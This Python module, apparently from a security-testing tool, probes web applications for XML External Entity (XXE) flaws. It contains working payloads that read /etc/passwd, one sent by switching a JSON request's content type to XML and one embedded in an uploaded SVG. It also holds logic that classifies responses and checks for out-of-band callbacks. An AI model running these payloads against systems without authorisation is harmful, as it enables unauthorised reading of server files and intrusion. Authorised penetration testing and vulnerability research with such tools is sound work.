#!/usr/bin/env python3
"""xxe_hunt.py — classic + blind OOB XML External Entity (XXE) probing.

Confirmed gap: zero XXE testing logic exists anywhere in Vikramaditya today (only
payloads.py templates). Two vectors: (1) content-type swap on a JSON API endpoint
(some frameworks parse the body as XML if Content-Type says so, ignoring the
declared route contract), (2) upload-vector XXE via SVG/DOCX/XLSX documents that
embed an external entity.

FP discipline: a parser error alone (500 + "XML" in body) is a [XXE-CANDIDATE]
lead — proves the parser touched attacker XML, not that the entity resolved. Only
in-band file-content (a recognizable /etc/passwd-shaped line) or a correlated OOB
callback (via interactsh_client) confirms.
"""
from __future__ import annotations

import re
from dataclasses import dataclass

# Linux/glibc-style /etc/passwd only ("root:x:0:0:...") — macOS/BSD-style
# entries ("root:*:0:0:...") are out of scope for v1 and will not match.
_PASSWD_MARKER = re.compile(r"root:x:0:0:")
_PARSER_ERROR_MARKER = re.compile(r"(?i)xml parsing error|undefined entity|DOCTYPE is not allowed")

_CONTENT_TYPE_SWAP_PAYLOAD = (
    '<?xml version="1.0"?>'
    '<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
    "<root>&xxe;</root>"
)

_SVG_XXE_PAYLOAD = (
    b'<?xml version="1.0" standalone="yes"?>'
    b'<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
    b'<svg width="128" height="128" xmlns="http://www.w3.org/2000/svg">'
    b'<text x="10" y="20">&xxe;</text></svg>'
)


@dataclass
class XxeResult:
    verdict: str  # "confirmed" | "candidate" | "clean"
    evidence: str


def probe_content_type_swap(client, url: str, json_body: dict) -> XxeResult:
    """Re-send a normally-JSON request as application/xml with an external-entity
    payload; the JSON body's shape is irrelevant, only the URL is reused."""
    response = client.post(
        url,
        headers={"Content-Type": "application/xml"},
        data=_CONTENT_TYPE_SWAP_PAYLOAD,
    )
    text = getattr(response, "text", "") or ""
    if _PASSWD_MARKER.search(text):
        return XxeResult(verdict="confirmed", evidence="in-band /etc/passwd content in response body")
    if response.status_code == 500 and _PARSER_ERROR_MARKER.search(text):
        return XxeResult(verdict="candidate", evidence="XML parser touched the payload but no impact proven")
    return XxeResult(verdict="clean", evidence="no XXE signal")


def probe_upload_xxe(client, endpoint: str, doc_type: str = "svg") -> XxeResult:
    """Upload an XXE-laden document. v1 supports SVG only (DOCX/XLSX are a
    zip-of-XML container — deferred, same interface, filed as a follow-up)."""
    if doc_type != "svg":
        return XxeResult(
            verdict="clean",
            evidence=f"doc_type={doc_type!r} not yet supported (svg only in v1)",
        )
    response = client.post(endpoint, files={"file": ("image.svg", _SVG_XXE_PAYLOAD, "image/svg+xml")})
    text = getattr(response, "text", "") or ""
    if _PASSWD_MARKER.search(text):
        return XxeResult(verdict="confirmed", evidence="in-band /etc/passwd content in upload response")
    # Gated on status_code >= 400 rather than the exact 500 that
    # probe_content_type_swap requires: upload endpoints commonly reject a
    # malformed/rejected file with a 400-class response (not just 500), and
    # we still want that counted as real error signal, not just any 2xx
    # response that happens to contain matching text. This deliberately
    # widens the status check while keeping the same "error + marker"
    # candidate discipline as the sibling function.
    if response.status_code >= 400 and _PARSER_ERROR_MARKER.search(text):
        return XxeResult(verdict="candidate", evidence="XML parser error on uploaded SVG")
    return XxeResult(verdict="clean", evidence="no XXE signal")


def confirm_blind_oob(session, token: str) -> XxeResult:
    """Check an interactsh session for a callback correlated to this probe's
    token. session is an interactsh_client.InteractshSession (or test double)."""
    callbacks = session.poll_callbacks(token)
    if callbacks:
        return XxeResult(verdict="confirmed", evidence=f"OOB callback received ({len(callbacks)} hit(s))")
    return XxeResult(verdict="candidate", evidence="no OOB callback yet — may need a longer poll window or egress is filtered")
